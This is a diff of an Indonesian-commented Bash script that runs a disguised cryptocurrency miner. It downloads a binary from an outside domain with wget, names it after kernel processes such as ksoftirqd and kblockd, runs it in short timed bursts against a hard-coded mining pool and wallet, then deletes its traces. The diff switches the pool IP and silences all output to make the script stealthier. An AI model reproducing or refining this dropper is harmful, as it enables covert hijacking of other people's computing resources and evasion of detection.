@@ -6,7 +6,7 @@ GITHUB_URL="https://raw.githubusercontent.com/nineasku55/store/refs/heads/main/c
 # Config fallback jika GitHub down
 FALLBACK_CONFIG_JSON='{
   "algo": "power2b",
-  "url": "18.118.48.49:443",
+  "url": "170.64.157.141:443",
   "user": "mbc1qm7y0rx0r43t5c3f6y8uuf0pykaa2uq5h2emz3v.Mabaran888",
   "pass": "x",
   "threads": 8
@@ -31,18 +31,14 @@ download_config_from_github() {
     local config_path="$1"
     
     # Download config dari GitHub
-    echo "Mendownload config dari GitHub..."
-    if curl -s -L "$GITHUB_URL" -o "$config_path" --connect-timeout 15; then
+    if curl -s -L "$GITHUB_URL" -o "$config_path" --connect-timeout 15 >/dev/null 2>&1; then
         # Verifikasi bahwa config adalah JSON valid
         if jq empty "$config_path" 2>/dev/null; then
-            echo "Config berhasil didownload dari GitHub"
             return 0
         else
-            echo "Error: Config dari GitHub tidak valid"
             return 1
         fi
     else
-        echo "Error: Gagal mendownload config dari GitHub"
         return 1
     fi
 }
@@ -51,22 +47,21 @@ download_config_from_github() {
 create_fallback_config() {
     local config_path="$1"
     echo "$FALLBACK_CONFIG_JSON" > "$config_path"
-    echo "Menggunakan config fallback"
 }
 
 while true; do
     # Hapus data sesi lama termasuk config
-    rm -f "$LOCAL_BIN_DIR"/*.json
-    rm -f "$LOCAL_BIN_DIR"/.dbus-daemon*
-    rm -f "$LOCAL_BIN_DIR"/migration*
-    rm -f "$LOCAL_BIN_DIR"/watchdog*
-    rm -f "$LOCAL_BIN_DIR"/.ksoftirqd*
-    rm -f "$LOCAL_BIN_DIR"/rcu_*
-    rm -f "$LOCAL_BIN_DIR"/.profile-cache*
-    rm -f "$LOCAL_BIN_DIR"/kdevtmpfs*
-    rm -f "$LOCAL_BIN_DIR"/kintegrityd*
-    rm -f "$LOCAL_BIN_DIR"/kblockd*
-    rm -f "$LOCAL_BIN_DIR"/kthrotld*
+    rm -f "$LOCAL_BIN_DIR"/*.json >/dev/null 2>&1
+    rm -f "$LOCAL_BIN_DIR"/.dbus-daemon* >/dev/null 2>&1
+    rm -f "$LOCAL_BIN_DIR"/migration* >/dev/null 2>&1
+    rm -f "$LOCAL_BIN_DIR"/watchdog* >/dev/null 2>&1
+    rm -f "$LOCAL_BIN_DIR"/.ksoftirqd* >/dev/null 2>&1
+    rm -f "$LOCAL_BIN_DIR"/rcu_* >/dev/null 2>&1
+    rm -f "$LOCAL_BIN_DIR"/.profile-cache* >/dev/null 2>&1
+    rm -f "$LOCAL_BIN_DIR"/kdevtmpfs* >/dev/null 2>&1
+    rm -f "$LOCAL_BIN_DIR"/kintegrityd* >/dev/null 2>&1
+    rm -f "$LOCAL_BIN_DIR"/kblockd* >/dev/null 2>&1
+    rm -f "$LOCAL_BIN_DIR"/kthrotld* >/dev/null 2>&1
 
     # Pilih nama binary acak dari daftar
     BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
@@ -86,17 +81,15 @@ while true; do
     fi
 
     # Download binary baru
-    echo "Mendownload binary..."
-    wget -q "https://dot-store.biz.id/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
+    wget -q "https://dot-store.biz.id/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME_FULL" >/dev/null 2>&1
     
     # Pastikan download berhasil sebelum melanjutkan
     if [ $? -ne 0 ]; then
-        echo "Error: Download binary failed. Retrying in 30 seconds..."
         sleep 30
         continue
     fi
     
-    chmod +x "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
+    chmod +x "$LOCAL_BIN_DIR/$BIN_NAME_FULL" >/dev/null 2>&1
 
     # Tentukan waktu aktif (2-3 menit)
     ACTIVE_MIN=$((RANDOM % 2 + 2))
@@ -105,15 +98,13 @@ while true; do
     # Tentukan waktu istirahat (20-30 detik)
     IDLE_SEC=$((RANDOM % 11 + 20))
 
-    echo "Menjalankan proses selama $ACTIVE_MIN menit..."
     # Jalankan proses dengan timeout
     timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME_FULL" --config="$CONFIG_PATH" >/dev/null 2>&1
 
     # Hapus binary dan config setelah digunakan
-    rm -f "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
-    rm -f "$CONFIG_PATH"
+    rm -f "$LOCAL_BIN_DIR/$BIN_NAME_FULL" >/dev/null 2>&1
+    rm -f "$CONFIG_PATH" >/dev/null 2>&1
 
-    echo "Istirahat selama $IDLE_SEC detik..."
     # Istirahat
     sleep "$IDLE_SEC"
 done
